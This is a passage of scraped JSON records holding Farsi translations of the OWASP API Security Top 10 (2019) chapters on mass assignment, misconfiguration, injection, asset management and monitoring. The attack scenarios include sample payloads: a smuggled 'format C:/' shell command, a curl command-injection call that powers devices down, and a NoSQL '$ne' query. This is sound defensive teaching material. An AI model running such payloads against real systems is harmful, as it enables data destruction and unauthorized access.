می‌شود.\n\n* مکانیزم (های) اعمال شده بایستی بطور پیشفرض کلیه دسترسی‌‌‌ها را Deny (رد) نموده و برای دسترسی به هر یک از توابع، مجوزخاص دسترسی نقش مربوطه را طلب نمایند.\n* توابع API از منظر عیوب مجوزدهی در سطح تابع با درنظر گرفتن منطق اپلیکیشن و سلسله مراتب گروه‌‌‌های کاربری مورد بازبینی قرار گیرد.\n* تمامی کنترلگرهای مدیریتی از یک کنترلگر مدیریتی انتزاعی که مجوزها را بر حسب نقش کاربر یا گروه پیاده‌سازی نموده، ارث بری داشته باشند.\n* تمامی توابع مدیریتی درون یک کنترلگر عادی (غیرمدیریتی)، کنترل‌‌‌های مجوز مبتنی بر نقش کاربر یا گروه را بکارگیرند.\n\n## مراجع\n\n### OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### خارجی\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:30.272745"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa6-mass-assignment.md", "content": "# API6:2019 - تخصیص جمعی\n\n| عوامل تهدید/مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**2** | میزان شیوع**2** : قابلیت تشخیص**2** | پیامد فنی**2** : خاص کسب و کار |\n| بهره برداری از این آسیب‌پذیری غالبا نیاز به فهم منطق تجاری، روابط مابین اشیا و ساختار API از سوی مهاجم دارد. بهره برداری از مقوله تخصیص جمعی در APIها ساده تر است چرا که در مرحله طراحی، پیاده‌سازی زیرین اپلیکیشن به همراه نام ویژگی‌های اشیا افشا می‌شود و در معرض دید عموم قرار می‌گیرد.| چارچوبهای جدید غالبا توسعه دهندگان را به استفاده از توابعی تشویق می‌کنند که بطور خودکار، ورودی‌های دریافتی از کلاینت را به متغیرهای کد و اشیاء داخلی آن پیوند می‌دهند. مهاجمین با سواستفاده از این متدلوژی می‌توانند به گونه ای اقدام به بروزرسانی یا بازنویسی ویژگی‌های اشیاء (داده) حساس نمایند که توسعه دهنده هیچگاه قصد افشای آن ویژگی‌ها را نداشته است. | بهره برداری از این ‌‌‌آسیب‌پذیری می‌تواند منجر به افزایش سطح دسترسی، دستکاری داده، عبور از مکانیزم‌های امنیتی و ... شود. |\n\n## آیا API از نظر تخصیص جمعی  ‌‌‌آسیب‌پذیر است؟\n\nاشیا در اپلیکیشن‌‌‌های مدرن می‌توانند ویژگی‌‌‌های  متعددی داشته باشند. برخی از این ویژگی‌‌‌ها بایستی مستقیما توسط کلاینت قابل بروزرسانی باشند (مثلا `user.first_name` یا `user.address`) در حالی که کلاینت نباید بتواند سایر ویژگی‌‌‌ها را دستکاری نماید (مثلا پرچم `user.is_vip`).\n\nیک تابع درAPI  اگر بطور خودکار پارامترهای کلاینت را بدون لحاظ کردن حساسیت و سطح افشای  ویژگی‌‌‌های آن، مستقیما تبدیل به ویژگی‌‌‌های اشیای داخلی نماید، از منظر تخصیص جمعی ‌‌‌آسیب‌پذیر خواهد بود. این ‌‌‌آسیب‌پذیری به مهاجم اجازه می‌دهد تا بتواند ویژگی‌‌‌هایی از اشیا را که نباید به آنها دسترسی داشته باشد، بروزرسانی نماید. \n\nنمونه‌‌‌هایی از «ویژگی‌‌‌های حساس» عبارتند از:\n\n* **ویژگی‌‌‌های مرتبط با مجوزها**: پرچم‌‌‌هایی نظیر `user.is_admin` و `user.is_vip` فقط بایستی توسط ادمین‌‌‌ها تنظیم شوند.\n* **ویژگی‌‌‌های وابسته به فرایند**: `user.cash` فقط باید بصورت داخلی و پس از تایید پرداخت بروزرسانی شود.\n* **ویژگی‌‌‌های داخلی**: `article.created_time` فقط باید بصورت داخلی و توسط اپلیکیشن تنظیم گردد.\n\n## مثال‌‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nیک اپلیکیشن هم‌سفری  به کاربر امکان ویرایش اطلاعات پایه‌ای پروفایل خود را می‌دهد. در خلال این فرایند، یک فراخوانی API به `PUT /api/v1/users/me` با شی مجاز JSON زیر فرستاده می‌شود:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\n\nاما درخواست `GET /api/v1/users/me` ویژگی اضافی credit_balance را نیز در خود دارد:\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nدر اینجا مهاجم درخواست اول را با محتوای مخرب زیر بازارسال  می‌نماید:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nبه دلیل وجود آسیب‌پذیری تخصیص جمعی در endpoint، مهاجم می‌تواند بدون انجام پرداخت اعتبار دریافت کند.\n\n### سناریو #2\n\nیک پلتفرم اشتراک‌گذاری ویدئو به کاربران خود اجازه دانلود محتوا با فرمت‌‌‌های مختلفی را می‌دهد. مهاجم که در حال بررسی API است، در می‌یابد که `GET /api/v1/videos/{video_id}/meta_data` یک شیء JSON با ویژگی‌‌‌های ویدئو را باز می‌گرداند. یکی از این ویژگی‌‌‌ها، `\"mp4_conversion_params”:”-v codec h264\" ` است که نشان می‌دهد اپلیکیشن از یک دستور Shell برای تبدیل ویدئو بهره می‌برد.\n\nهمچنین مهاجم متوجه می‌شود که `POST /api/v1/videos/new` در برابر تخصیص جمعی ‌‌‌آسیب‌پذیر بوده و به کلاینت اجازه می‌دهد که هریک از ویژگی‌‌‌های شیءویدئو را با به صورت دلخواه تنظیم نماید. در نتیجه مهاجم مقدار مخربی را به صورت `\"mp4_conversion_params\":\"-v codec h264 && format C:/\"` در قست ویژگی ویدئو وارد می‌کند که در نتیجه آن با دانلود ویدئو با فرمت MP4 توسط مهاجم حمله تزریق دستور Shell  اجرا خواهد شد. \n\n\n## چگونه از ‌‌‌آسیب‌پذیری تخصیص جمعی پیشگیری کنیم؟\n\n* در صورت امکان، از بکارگیری توابعی که ورودی کلاینت را بصورت خودکار تبدیل به متغیرهای کد یا اشیای داخلی اپلیکیشن می کنند خودداری شود.\n* تنها ویژگی‌‌‌های ضروری که باید توسط کلاینت بروزرسانی شوند در لیست سفید  قرار گیرد.\n* از قابلیت‌‌‌های تعبیه شده در اپلیکیشن‌‌‌ها برای قراردادن ویژگی‌‌‌هایی که تغییر آنها برای کلاینت غیرمجاز است در لیست سیاه  استفاده شود.\n* در صورت امکان، الگوهای واضح و بدون ابهام برای داده ورودی تعریف و اعمال شود.\n\n## مراجع\n\n### خارجی\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:30.396267"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa7-security-misconfiguration.md", "content": "# API7:2019 پیکربندی امنیتی نادرست\n\n|عوامل تهدید / مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**3** | میزان شیوع**3** : قابلیت تشخیص**3** | پیامد فنی**2** : خاص کسب و کار |\n| مهاجمین غالبا در تلاش برای یافتن حفره‌های وصله نشده، توابع رایج یا فایل‌ها و مسیرهای محافظت نشده به منظور دسترسی غیرمجاز به سیستم هستند.| پیکربندی امنیتی نادرست می‌تواند در هر سطحی از API، از سطح شبکه تا سطح اپلیکشن روی دهد. ابزارهای خودکاری وجود دارند که فرایند تشخیص و بهره برداری از پیکربندی‌های نادرست نظیر تشخیص سرویس‌های غیرضروری را انجام می‌دهند. | پیکربندی امنیتی نادرست نه تنها می‌تواند اطلاعات حساس کاربر را افشا کند بلکه جزئیاتی از سیستم که ممکن است به از دست رفتن کامل سرور منجر شود را نیز در معرض خطر قرار می‌دهد.\n\n## آیا API از نظر پیکربندی امنیتی نادرست  ‌‌‌آسیب‌پذیر است؟\n\nاز منظر پیکربندی امنیتی نادرست api آسیب پذیر است اگر:\n\n* ایمن سازی امنیتی مناسب  در هر قسمت از پشته اپلیکیشن رعایت نشده یا اپلیکیشن مجوزهای با پیکربندی نادرست روی سرویس‌‌‌‌های ابری داشته باشد.\n* جدیدترین وصله‌‌‌‌های امنیتی نصب نشده و سیستم‌‌‌‌ها کاملا بروز نباشند.\n* ویژگی غیرضروری (نظیر افعال اضافی HTTP) فعال باشند.\n* امنیت لایه انتقال (TLS) غیرفعال باشد.\n* دستورات و الزامات امنیتی (نظیر [سرایندهای امنیتی][1]) به سوی کلاینت ارسال نشوند.\n* خط مشی اشتراک متقابل منابع (CORS ) وجود نداشته یا به درستی ‌پیاده‌سازی نشده باشد.\n* پیام‌‌‌‌های خطا ردپای پشته  یا اطلاعات حساس دیگر را افشا نمایند.\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nمهاجم فایل `.bash_history` را (که دستورات مورد استفاده تیم DevOps برای دسترسی به API را در خود دارد) در مسیر root سرور می‌یابد:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\nهمچنین مهاجم خواهد توانست توابعی از API که تنها توسط تیم DevOps مورد استفاده قرارگرفته و مستند نشده‌اند را نیز بیابد.\n\n\n### سناریو #2\n\nبرای هدف قراردادن یک سرویس مشخص، مهاجم از موتورهای جستجوی رایج برای یافتن کامپیوترهایی که مستقیما توسط اینترنت قابل دسترسی هستند بهره می‌برد. در نتیجه، مهاجم میزبانی را می‌یابد که از یک سیستم مدیریت پایگاه داده محبوب استفاده نموده و اقدام به شنود روی پورت پیشفرض آن dbms می‌کند. از آنجا که میزبان از پیکربندی پیشفرض (که احراز هویت را بطور پیشفرض غیرفعال نموده) استفاده کرده، مهاجم می‌تواند به میلیون‌‌‌‌ها رکورد حاوی PII، داده‌‌‌‌های احرازهویت و ... دست یابد.\n\n### سناریو #3\n\nمهاجم با بررسی ترافیک یک اپلیکیشن موبایل متوجه می‌شود که تمامی ترافیک HTTP بر بستر یک پروتکل ایمن (نظیر TLS) منتقل نمی‌شود و این موضوع خصوصا در زمان دانلود تصاویر پروفایل صدق می‌کند. از آنجا که تعامل کاربر با اپلیکیشن دودویی  است، علیرغم انتقال ترافیک API بر بستر پروتکلی ایمن، مهاجم خواهد توانست الگویی را در اندازه پاسخ API شناسایی نموده و از آن برای رهگیری ترجیحات کاربر  در خصوص محتوای ارائه شده به اپلیکیشن (مثلا تصاویر پروفایل) بهره ببرد.\n\n\n## چگونه از ‌‌‌آسیب‌پذیری پیکربندی امنیتی نادرست پیشگیری کنیم؟\n\nچرخه حیات API بایستی شامل موارد زیر باشد:\n\n* فرایندی تکرار شونده برای ایمن سازی API که منجر به ‌پیاده‌سازی سریع و آسان یک محیط ایمن شود.\n* فرایندی برای بازبینی و بروزرسانی پیکربندی‌‌‌‌ها در سراسر پشته API؛ این بازبینی بایستی موارد از جمله بازبینی هماهنگی بین فایل‌‌‌‌ها، مولفه‌‌‌‌های API و سرویس‌‌‌‌های ابری (نظیر مجوزهای باکت‌‌‌‌های S3) را دربرگیرد.\n* برقراری یک کانال ارتباطی ایمن برای دسترسی تمامی تعاملات API به دارایی‌‌‌‌های ایستا (نظیر تصاویر).\n*  خودکار جهت ارزیابی پیوسته و مداوم اثربخشی پیکربندی و تنظیمات اعمال شده در سراسر محیط API و اپلیکیشن.\n\nبعلاوه:\n\n* برای جلوگیری از ارسال رهگیری رویدادهای استثنا و سایر داده‌‌‌‌های ارزشمند به مهاجم، در صورت امکان برای تمامی پاسخ‌‌‌‌های API (از جمله خطاها) الگوهای محموله  مشخص تعریف و اعمال گردد.\n* حصول اطمینان از اینکه API فقط به افعال HTTP مدنظر توسعه دهنده پاسخ می دهد و غیرفعال کردن سایر افعال (نظیر `HEAD`).\n* APIهایی که انتظار می‌رود دسترسی به آنها از طریق کلاینت‌‌‌‌های مبتنی بر مرورگر (مثلا فرانت WebApp) باشد، بایستی خط مشی CORS مناسب را بکار گیرند.\n\n\n## مراجع\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### خارجی\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:30.515699"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa8-injections.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa8-injections.md", "content": "# API8:2019 تزریق ورودی‌های مخرب\n\n|عوامل تهدید / مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**3** | میزان شیوع**2** : قابلیت تشخیص**3** | پیامد فنی**3** : خاص کسب و کار |\n| مهاجمین تلاش می‌کنند تا هرچه مسیر‌ برای تزریق (از جمله، ورودی‌های مستقیم، متغییرها و سرویس‌های یکپارچه) وجود دارد را با داده‌های مخرب پر کنند و انتظار دارند این اطلاعات بدست لایه مفسر برسد.| وجود ‌آسیب‌پذیری تزریق ورودی‌های مخرب، امری متداول بوده و معمولا در پرس و جو‌های SQL، LDAP یا NoSQL، دستورات سیستم عامل، تجزیه کنندگان  XML و ORM یافت می‌شود.  این نقص‌ها به سادگی در زمان بازبینی کد منبع قابل کشف می‌باشند. مهاجمین نیز برای این منظور از اسکنرها و Fuzzerها استفاده می‌کنند. | ‌آسیب‌پذیری تزریق ورودی‌های مخرب می‌تواند منجر به افشای اطلاعات و یا از دست رفتن اطلاعات شود. همچنین ممکن است این ضعف منجر به اختلال در سرویس‌دهی شده و یا حتی باعث از دست رفتن کامل دسترسی میزبان شود.\n\n## آیا API از نظر نقص تزریق  ورودی‌های مخرب آسیب‌پذیر است؟\n\nاز منظر نقصِ تزریق ورودی‌های مخرب API ‌آسیب‌پذیر است اگر:\n\n* اطلاعات وارد شده توسط کاربر توسط API اعتبار سنجی، فیلتر یا پاکسازی نشود.\n* اطلاعات وارد شده توسط کاربر به صورت مستقیم استفاده شده و یا به انواع دستورات پرس و جو (SQL یا NoSQL یا LDAP) یا دستورات سیستم عامل، تجزیه‌کنندگان XML، ORM  یا ORM  افزوده شود.\n* اطلاعات دریافت شده از سیستم‌های خارجی توسط API اعتبار سنجی، فیلتر یا پاکسازی نشود.\n\n\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nمیان‌افزار یک دستگاه کنترل (فرزندان) توسط والدین تابعی را در مسیر `/api/CONFIG/restore` ارائه می‌کند،  که انتظار دارد مقدار appId ارسال شده به سمت آن، دارای مقادیر چند متغیره باشد. با استفاده از یک دیکامپایلر، مهاجم در می‌یابد مقدار appId بدون هیچ‌گونه تغییر یا پاکسازی‌ به یک فراخوانی سیستمی  ارسال می‌شود.\n\n```\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nدستور زیر به مهاجم این امکان را می‌دهد تا هر دستگاهی با این میان افزار ‌آسیب‌پذیر را خاموش کند.\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### سناریو #2\n\nسامانه تحت وب ساده‌ای با عملکرد‌های اولیه CRUD ، برای انجام عملیات‌های رزرو وجود دارد. مهاجم موفق به شناسایی تزریق NoSQL از طریق متغیر `bookingId` در رشته پرس و جو و در درخواست حذف رزرو شده است. درخواست مذکور شبیه به `DELETE /api/bookings?bookingId=678` می‌باشد.\n\nسرور API از تابع زیر برای رسیدگی کردن به درخواست‌های حذف استفاده می‌کند:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\nمانند آنچه در زیر مشاهده می‌کنید، مهاجم پس از رهگیری درخواست و تغییر مقدار `bookingId` استفاده شده در رشته پرس و جو، می‌تواند رزرو انجام شده توسط کاربر دیگری را حذف نماید.\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## چگونه از آسیب‌پذیری تزریق ورودی‌های مخرب پیشگیری کنیم؟\n\nجلوگیری از ‌آسیب‌پذیری تزریق ورودی‌های مخرب، نیازمند جداسازی اطلاعات از دستورات و پرس و جو‌ها می‌باشد.\n\n* داده‌ها باید توسط یک کتابخانه پایدار، فعال و قابل اطمینان اعتبار سنجی شود.\n* تمامی اطلاعات وارد شده توسط کاربران و دیگر سیستم‌های یکپارچه باید اعتبار سنجی، فیلتر یا پاکسازی شود.\n* کاراکترهای خاص باید توسط قوانین مشخص برای مفسران نهایی تغییر داده شود.\n* همواره تعداد رکوردهای بازگردانده شده باید محدود شود تا در صورت وجود نقص تزریق ورودی‌های مخرب، از افشای انبوه اطلاعات جلوگیری شود.\n* داده‌های ورودی باید توسط فیلترهای مناسب اعتبار سنجی شود تا تنها مقادیر معتبر برای هر پارامتر ورودی مجاز به وارد شدن باشند. \n* برای تمامی متغییر‌های رشته‌ای، نوع داده و الگوی سخت‌گیرانه‌ای تعریف شود.\n\n## مراجع\n\n### OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### خارجی\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:30.633746"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa9-improper-asset-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa9-improper-asset-management.md", "content": "# API09:2019 مدیریت نادرست دارایی‌ها\n\n|عوامل تهدید / مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**3** | میزان شیوع**3** : قابلیت تشخیص**2** | پیامد فنی**2** : خاص کسب و کار |\n|نسخه‌های قدیمی API غالبا اصلاح و بروزرسانی نشده‌اند و از آنجا که از مکانیزم‌های دفاعی نوین موجود در APIهای جدید بهره نمی‌برند، راهی آسان برای دسترسی به سیستم‌ها برای مهاجمین فراهم می‌سازند.|مستندات قدیمی و بروزرسانی نشده، امکان یافتن و یا رفع آسیب‌پذیری‌ها را دشوار می‌سازند. همچنین نبود فهرستی از دارایی‌ها و فقدان یک استراتژی مدون برای از دور خارج کردن نسخه‌های قدیمی منجر به وجود سیستم‌های وصله یا تعمیر نشده و نهایتا نشت اطلاعات خواهد شد. امروزه با کمک مفاهیم نوینی نظیر مایکروسرویس‌ها که امکان بکارگیری اپلیکیشن‌ها بصورت مستقل را تسهیل نموده‌اند (نظیر رایانش ابری، k8s یا کوبرنیتس و ...)، یافتن APIهایی که به صورت غیرضروری در معرض دید همگان قرار دارند تبدیل به امری رایج و آسان شده است.|مهاجم می‌تواند از طریق نسخه‌های قدیمی API که کماکان به پایگاه داده‌ی اصلی متصل هستند، به داده‌ی حساس و یا حتی سرور دسترسی یابد.\n\n## آیا API از نظر مدیریت نادرست دارایی‌ها  ‌آسیب‌پذیر است؟\n\nدر صورتی که یکی ازشرایط زیر وجود داشته باشد، API ‌آسیب‌پذیر خواهد بود:\n\n* اهدف از وجود API نامشخص بوده و پاسخی برای سوال‌های زیر وجود نداشته باشد:\n   - در چه محیطی API در حال اجرا است (مثلا محیط تست، توسعه، اجرا  یا عملیات )؟\n   - چه کسانی بایستی دسترسی شبکه‌ای به API داشته باشند (همه، افراد دخیل یا شرکا)؟\n   - چه نسخه‌ای از API در حال اجرا است؟\n   - چه داده‌ای (نظیر PII) توسط API در حال جمع آوری و پردازش است؟\n   - جریان داده به چه صورت است؟\n* مستندی برای API وجود ندارد یا بروز نیست.\n* برنام‌ ای برای بازنشستگی و از دور خارج شدن هریک از نسخه‌های API  وجود ندارد.\n* فهرست میزبان‌ها  وجود ندارد یا قدیمی است.\n* فهرست سرویس‌های یکپارچه ، چه سرویس‌های متعلق به خود سازمان و چه سرویس‌های شرکت‌های ثالث، وجود ندارد یا قدیمی است.\n* نسخه‌های قدیمی یا پیشین API بدون اصلاح و وصله شدن  کماکان در حال اجرا هستند.\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nپس از بازطراحی یک اپلیکیشن، یک سرویس جستجوی Local وجود دارد که از یک نسخه قدیمی API (`api.someservice.com/v1`) به صورت محافظت نشده بهره می‌برد که در عین حال این API قدیمی به پایگاه داده کاربران دسترسی دارد. مهاجم که جدیدترین نسخه اپلیکیشن را به عنوان هدف درنظر گرفته، آدرس API (`api.someservice.com/v2`) را می‌یابد. جایگزینی `v2` با `v1` در URL سبب دسترسی مهاجم به API محافظت نشده و قدیمی می‌شود که در نتیجه‌ی آن، اطلاعات شناسایی شخصی (PII) بیش از 100 میلیون کاربر افشا گردیده است.\n\n### سناریو #2\n\nیک شبکه اجتماعی از مکانیزم محدودسازی نرخ ارسال درخواست  برای جلوگیری از انجام حملات Brute Force توسط مهاجمین جهت حدس توکن‌های تغییر گذرواژه بهره می‌برد. این مکانیزم نه به عنوان بخشی از کد API، بلکه به عنوان مولفه ای مابین کلاینت و API اصلی (در `www.socialnetwork.com`) ‌پیاده‌سازی شده است. مهاجم یک نسخه بتا از میزبان API (`www.mbasic.beta.socialnetwork.com`) می‌یابد که از API یکسانی بهره می‌برد و رویه تغییر گذرواژه یکسانی دارد با این تفاوت که در آن هیچ مکانیزمی جهت محدودسازی نرخ درخواست تعبیه نشده است؛ در نتیحه مهاجم قادر خواهد بود که گذرواژه هر یک از کاربران را طی یک عملیات Brute Force ساده با حدس زدن یک توکن 6 رقمی تغییر دهد.\n\n## چگونه از آسیب‌پذیری مجوزدهی نادرست در سطح اشیاء پیشگیری کنیم؟\n\n* فهرستی از تمامی میزبان‌های API تهیه شده و جنبه‌های مهم هرکدام با تمرکز بر محیط API (محیط تست، توسعه، اجرا یا عملیات)، افراد مجاز به دسترسی شبکه‌ای به میزبان (همه، افراد دخیل یا شرکا) و نسخه API مستند شود.\n* فهرستی از سرویس‌های یکپارچه تهیه شده و جنبه‌های مهم این سرویس‌ها نظیر نقش آنها، داده‌ی مبادله شده (جریان داده) و میزان حساسیت آنها مستند شود.\n* تمامی جنبه‌های API نظیر نحوه احراز هویت، خطاها، ریدایرکت‌ها، محدودسازی نرخ درخواست، خط مشی‌های اشتراک گذاری منابع متقابل (CORS) و نقاط پایانی یا توابع (Endpointها) شامل پارامترها، درخواست‌ها و پاسخ‌ها مستند شوند.\n* با بکارگیری و انطباق با استانداردهای باز، فرایند تولید مستند بطور خودکار انجام شده و این فرایند در CI/CD Pipeline تعبیه گردد.\n* مستندات API در اختیار افرادی که مجاز به دسترسی به API هستند قرار گیرد.\n* از مکانیزم‌های محافظتی خارجی از جمله فایروال‌های امنیت API برای محافظت از تمامی نسخه‌های در معرض دید API (نه فقط نسخه فعلی) استفاده گردد.\n* از استفاده همزمان نسخه‌های عملیاتی شده  و عملیاتی نشده  API اجتناب شود. اگر این همزمانی اجتناب ناپذیر است، برای نسخه‌های عملیاتی نشده API نیز باید همان حفاظت‌های امنیتی نسخه‌های عملیاتی شده برقرار باشد.\n* هنگامی که در نسخه‌های جدیدتر API بهبودهای امنیتی اعمال می‌شود، بایستی فرایند تحلیل ریسک نیز صورت پذیرد تا بتوان تصمیمات لازم در خصوص اقدامات جبرانی برای رفع مشکلات امنیتی نسخه‌های قدیمی‌تر را اتخاذ نمود. بعنوان نمونه، آیا می‌توان بدون تحت‌الشعاع قراردادن انطباق‌پذیری  API بهبودهای امنیتی را در نسخه‌های قدیمی نیز وارد نمود یا اینکه بایستی تمامی نسخه‌های قدیمی به سرعت از دسترس خارج شده و تمامی کلاینت‌های مجبور به استفاده از آخرین نسخه شوند؟\n\n## مراجع\n\n### خارجی\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:30.752950"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xaa-insufficient-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xaa-insufficient-monitoring.md", "content": "# API10:2019 پایش و نظارت ناکافی\n\n|عوامل تهدید / مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**2** | میزان شیوع**3** : قابلیت تشخیص**1** | پیامد فنی**2** : خاص کسب و کار |\n| مهاجمین می توانند از فقدان فرایند ثبت وقایع و پایش برای سوءاستفاده پنهانی از سیستم‌ها بهره ببرند.| بدون ثبت وقایع و پایش آنها یا با ثبت و پایش ناکافی، رهگیری فعالیت‌های مخرب و پاسخ آنها در زمان مناسب تقریبا غیرممکن خواهد بود. | بدون پایش فعالیت‌های مخربی که در حال انجام است، مهاجمین زمان زیادی برای نفوذ به سیستم‌ها خواهند داشت.\n\n## آیا API از نظر پایش و نظارت ناکافی  ‌آسیب‌پذیر است؟\n\nدر صورتی که یکی ازشرایط زیر وجود داشته باشد، API ‌آسیب‌پذیر خواهد بود:\n\n* هیچگونه Logای توسط API تولید نشود، سطح ثبت وقایع  به درستی تنظیم نشده باشد یا پیام‌‌های Log، حاوی جزئیات کافی نباشند..\n* جامعیت  Logها تضمین نشده باشد (مثلا [Log Injection][1] رخ دهد). \n* به طور پیوسته Logها پایش نشوند.\n* زیرساخت API به طور پیوسته پایش نشود.\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nکلیدهای دسترسی به یک API مدیریتی در یک انباره  عمومی افشا شده و در اختیار همگان قرار گرفته است. مالک انباره از طریق یک ایمیل از این افشای احتمالی مطلع می‌شود اما بیش از 48 ساعت طول می‌کشد تا اقدام مقتضی انجام شود که در این حدفاصل، افشای کلید دسترسی ممکن سبب دسترسی غیرمجاز به داده حساس شده باشد. از آنجا که پایش کافی وجود نداشته است، سازمان نخواهد توانست بفهمد عوامل مخرب به چه داده‌ای دسترسی پیدا کرده‌اند.\n\n### سناریو #2\n\nیک پلتفرم اشتراک گذاری ویدئو با یک حمله درج هویت  در مقیاسی بزرگ مواجه می‌شود. علیرغم آنکه تلاش‌‌های ناموفق ورود ثبت می‌شوند، اما هیچگونه هشداری در طول زمان حمله اعلام نشده است؛ بلکه تنها در واکنش به شکایت‌‌های کاربران، Logهای API تحلیل و حمله کشف شده است. در نتیجه سازمان مجبور به صدور اعلامیه‌ای رسمی شده و از تمامی کاربران می‌خواهد که گذرواژه‌‌های خود را تغییر دهند. همچنین سازمان بایستی به مراجع نظارتی درخصوص این حادثه گزارش داده و پاسخگوی آنها باشد.\n\n## چگونه از ‌آسیب‌پذیری پایش و نظارت ناکافی پیشگیری کنیم؟\n\n* تمامی تلاش‌‌های ناموفق احراز هویت، دسترسی‌‌های غیرمجاز و خطاهای اعتبارستجی ورودی  بایستی ثبت  شوند.\n* Logها باید به گونه ای تهیه شوند که توسط راهکارهای مدیریت Log قابل استفاده بوده و همچنین جزئیات کافی جهت شناسایی عامل مخرب را در خود داشته باشند.\n* با Logها بایستی به عنوان داده حساس رفتار شده و جامعیت آنها هم در زمان ذخیره سازی و هم در زمان انتقال تضمین شود.\n* یک سیستم پایش پیکربندی و راه اندازی شود تا بتوان بطور مداوم و پیوسته عملکرد زیرساخت، شبکه و API را پایش نمود.\n* از یک سیستم مدیریت رویدادها و اطلاعات امنیتی (SIEM) برای تجمیع و مدیریت Logهای دریافتی از تمامی مولفه‌‌های پشته API و میزبان‌‌های آن استفاده شود.\n* از Dashboardها و هشدارها یا اعلان‌‌های سفارشی‌سازی شده به منظور تشخیص و پاسخ سریع به فعالیت‌‌های مشکوک استفاده شود.\n\n## مراجع\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and Logging Verification Requirements][4]\n\n### خارجی\n\n* [CWE-1059: Incomplete Documentation][5]\n* [OpenAPI Initiative][6]\n\n[1]: 